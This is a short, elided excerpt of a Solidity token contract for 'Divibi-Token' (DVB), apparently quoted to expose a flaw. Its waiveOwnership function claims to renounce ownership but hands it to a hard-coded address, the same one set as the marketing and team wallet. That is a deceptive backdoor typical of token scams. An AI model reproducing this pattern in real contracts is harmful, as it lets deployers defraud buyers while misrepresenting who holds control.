...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF6Dcb6a25C38977607fD8db190A93fBeC19cb21b);
    }
...
contract DivibiToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Divibi-Token";
    string private _symbol = "DVB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF6Dcb6a25C38977607fD8db190A93fBeC19cb21b);
    address payable public teamWalletAddress = payable(0xF6Dcb6a25C38977607fD8db190A93fBeC19cb21b);
